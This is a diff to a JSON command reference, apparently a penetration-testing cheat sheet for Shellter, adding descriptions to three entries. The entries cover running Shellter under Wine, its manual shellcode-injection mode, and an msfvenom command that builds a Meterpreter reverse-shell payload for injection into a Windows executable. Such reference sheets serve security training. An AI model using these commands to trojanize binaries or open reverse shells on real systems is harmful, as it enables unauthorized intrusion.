@@ -34,17 +34,20 @@
     {
       "command": "wine shellter.exe",
       "caption": "Run shellter via wine on Kali Linux",
-      "label": "Run under wine"
+      "label": "Run under wine",
+      "description": "Runs a Windows executable on Linux using Wine. Allows using Windows-only tools (like SharpHound or Rubeus) from a Linux attack host without a Windows VM."
     },
     {
       "command": "# Manual mode: M\n# Allows custom shellcode injection (paste hex shellcode from msfvenom -f hex)",
       "caption": "Manual mode for custom msfvenom shellcode",
-      "label": "Manual mode: M # Allows custom she…"
+      "label": "Manual mode: M # Allows custom she…",
+      "description": "Generates a custom payload with msfvenom for use in exploitation. Output format and encoding can be adjusted for the target platform and evasion needs."
     },
     {
       "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o payload.raw\n# Then in shellter Manual mode, load payload.raw",
       "caption": "Generate raw payload for shellter manual mode",
-      "label": "msfvenom"
+      "label": "msfvenom",
+      "description": "Generates a Windows reverse shell payload with msfvenom. Creates an executable or shellcode that connects back to your listener when run on the target."
     }
   ],
   "examples": [
